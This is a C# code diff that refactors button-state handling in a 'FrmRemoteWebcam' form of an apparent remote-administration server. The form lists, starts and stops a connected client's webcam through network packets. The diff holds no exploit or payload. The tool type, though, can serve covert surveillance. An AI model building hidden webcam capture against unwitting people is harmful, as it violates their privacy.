@@ -1,5 +1,4 @@
-﻿using Serveur.Controllers;
-using Serveur.Controllers.Server;
+﻿using Serveur.Controllers.Server;
 using Serveur.Packets.ServerPackets;
 using System;
 using System.Collections.Generic;
@@ -12,7 +11,6 @@ namespace Serveur.Views
     public partial class FrmRemoteWebcam : Form
     {
         public ClientMosaic client;
-        public FrmRemoteWebcamController frmRemoteWebcamController;
         private Dictionary<string, List<string>> _webcams;
         public bool IsStarted { get; private set; }
 
@@ -20,20 +18,17 @@ namespace Serveur.Views
         {
             this.client = client;
             client.value.frmWbc = this;
-            frmRemoteWebcamController = new FrmRemoteWebcamController(client);
             InitializeComponent();
         }
 
         private void FrmRemoteWebcam_Load(object sender, EventArgs e)
         {
+            setToolStrip(false);
             new GetAvailableWebcams().Execute(client);
         }
 
         private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
         {
-            //if(!pbWebcam.IsDisposed && !pbWebcam.Disposing)
-            //    pbWebcam.Dispose();
-
             if (IsStarted == true)
                 new StopWebcam().Execute(client);
 
@@ -42,29 +37,28 @@ namespace Serveur.Views
 
         private void btnStart_Click(object sender, EventArgs e)
         {
-            btnStop.Enabled = true;
-            btnStart.Enabled = false;
-            cboResolutions.Enabled = false;
-            cboWebcams.Enabled = false;
-            IsStarted = true;
+            setToolStrip(true);
             this.ActiveControl = pbWebcam;
             new GetWebcam(cboResolutions.SelectedIndex, cboWebcams.SelectedIndex).Execute(client);
         }
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            btnStop.Enabled = false;
-
             if (IsStarted == true)
              new StopWebcam().Execute(client);
-
-            if (btnStart.Enabled == false) btnStart.Enabled = true;
-            if (cboWebcams.Enabled == false) cboWebcams.Enabled = true;
-            if (cboResolutions.Enabled == false) cboResolutions.Enabled = true;
-
-            IsStarted = false;
+            setToolStrip(false);
         }
 
+        public void setToolStrip(bool state)
+        {
+            btnStart.Enabled = !state;
+            cboWebcams.Enabled = !state;
+            cboResolutions.Enabled = !state;
+            btnStop.Enabled = state;
+            IsStarted = state;
+        }
+
+        //CALLBACK
         public void AddWebcams(Dictionary<string, List<string>> webcams)
         {
             this._webcams = webcams;
